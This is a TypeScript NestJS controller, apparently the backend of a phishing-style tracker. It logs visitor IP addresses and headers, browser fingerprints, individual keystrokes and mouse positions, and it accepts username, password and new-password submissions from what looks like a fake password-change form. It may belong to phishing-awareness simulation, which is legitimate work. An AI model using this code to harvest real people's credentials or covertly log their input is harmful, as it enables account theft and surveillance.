import {
    BadRequestException,
    Body,
    Controller,
    Get,
    Ip,
    Param,
    ParseIntPipe,
    Post,
    Put,
    Request,
} from '@nestjs/common';
import {TrackerService} from "./tracker.service";

@Controller('tracker')
export class TrackerController {
    constructor(private readonly schedulerService: TrackerService) {
    }

    @Get("t/:trackerId")
    async triggerTracker(@Param("trackerId") trackerId: number, @Ip() ip: string, @Request() req: Request) {
        try {
            await this.schedulerService.triggerTracker(trackerId, ip, req.headers);
        } catch (e) {
            throw new BadRequestException("bad input");
        }
        return "ok";
    }

    @Post("pressKey/:trackerId")
    async pressKey(@Param("trackerId", ParseIntPipe) trackerId: number, @Body() body: { key: string, selected: string }) {
        try {
            await this.schedulerService.pressKey(trackerId, body.key, body.selected);
        } catch (e) {
            throw new BadRequestException("bad input");
        }
        return "ok";
    }

    @Post("startSession/:trackerId")
    async startSession(@Param("trackerId", ParseIntPipe) trackerId: number,
               @Ip() ip: string,
               @Body() body: {
                   userAgent: string,
                   platform: string,
                   language: string,
                   cookiesEnabled: boolean,
                   screenSize: string,
                   windowSize: string
               }) {
        return await this.schedulerService.startSession(trackerId, {
            ipAddress: ip,
            ...body
        });
    }

    @Put("endSession/:sessionId")
    async endSession(@Param("sessionId", ParseIntPipe) sessionId: number) {
        return await this.schedulerService.endSession(sessionId);
    }

    @Post("submit/:sessionId")
    async submit(@Param("sessionId", ParseIntPipe) sessionId: number, @Body() body: { username: string, password: string, newPassword: string, newPasswordConfirm: string }) {
        return await this.schedulerService.submit(sessionId, body.username, body.password, body.newPassword, body.newPasswordConfirm);
    }

    @Post("mousePos/:sessionId")
    async mousePos(@Param("sessionId", ParseIntPipe) sessionId: number, @Body() body: { x: number, y: number }) {
        return await this.schedulerService.mousePos(sessionId, body.x, body.y);
    }
}
